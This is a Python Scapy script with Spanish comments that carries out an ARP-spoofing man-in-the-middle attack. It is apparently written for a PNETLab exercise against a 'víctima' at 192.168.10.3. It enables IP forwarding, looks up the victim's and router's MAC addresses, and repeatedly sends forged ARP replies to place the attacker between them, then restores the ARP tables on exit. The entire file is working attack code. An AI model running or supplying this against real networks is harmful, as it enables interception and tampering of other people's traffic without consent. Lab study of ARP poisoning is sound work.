#!/usr/bin/env python3
from scapy.all import *
import time
import os
import sys

# --- CONFIGURACIÓN ---
iface = "ens3"             # Interfaz de red en PNETLab
victim_ip = "192.168.10.3" # IP de la Víctima
router_ip = "192.168.10.1" # IP del Router (Gateway)
# ---------------------

# 1. Activar IP Forwarding (Para que la víctima no pierda internet)
print(f"[+] Activando IP Forwarding en Linux...")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Obtener tu propia MAC
my_mac = get_if_hwaddr(iface)

print(f"[+] Tu MAC (Atacante): {my_mac}")
print(f"[+] Buscando MACs de la víctima ({victim_ip}) y Router ({router_ip})...")

def get_mac(ip):
    # Preguntar quién tiene esta IP
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

victim_mac = get_mac(victim_ip)
router_mac = get_mac(router_ip)

if not victim_mac:
    print(f"[!] ERROR: No encuentro a la víctima ({victim_ip}). ¿Está encendida?")
    sys.exit(1)
if not router_mac:
    print(f"[!] ERROR: No encuentro al Router ({router_ip}).")
    sys.exit(1)

print(f"[+] VÍCTIMA ENCONTRADA -> MAC: {victim_mac}")
print(f"[+] ROUTER ENCONTRADO  -> MAC: {router_mac}")
print("-" * 50)
print("[+] ¡ATAQUE INICIADO! Eres el hombre en el medio.")
print("[+] Presiona Ctrl + C para detener.")

try:
    while True:
        # Engañar a la víctima (Decirle que YO soy el Router)
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=my_mac), iface=iface, verbose=False)
        
        # Engañar al Router (Decirle que YO soy la víctima)
        send(ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=my_mac), iface=iface, verbose=False)
        
        time.sleep(2) # Intervalo entre paquetes falsos

except KeyboardInterrupt:
    print("\n[!] Deteniendo ataque y restaurando red...")
    # Restaurar la verdad (Arreglar las tablas ARP)
    send(ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=router_ip, hwsrc=router_mac), iface=iface, count=5, verbose=False)
    send(ARP(op=2, pdst=router_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=victim_ip, hwsrc=victim_mac), iface=iface, count=5, verbose=False)
    print("[+] Tablas restauradas. IP Forwarding desactivado.")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")